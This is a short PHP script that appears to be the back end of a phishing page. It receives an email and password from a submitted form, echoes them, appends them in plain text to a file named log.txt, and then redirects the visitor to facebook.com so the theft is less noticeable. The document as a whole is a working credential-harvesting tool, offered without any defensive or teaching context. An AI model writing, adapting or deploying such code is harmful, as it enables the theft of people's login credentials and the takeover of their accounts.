<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : "No email received";
    $password = isset($_POST["password"]) ? $_POST["password"] : "No password received";

 
    echo "Received Email: " . $email . "<br>";
    echo "Received Password: " . $password . "<br>";

    // Save credentials to log.txt
    $file = fopen("log.txt", "a");
    if ($file) {
        fwrite($file, "Email: $email | Password: $password\n");
        fclose($file);
    } else {
        echo "Error: Unable to open log.txt";
    }


    header("refresh:2;url=https://facebook.com");
    exit();
} else {
    echo "No POST data received!";
}
?>
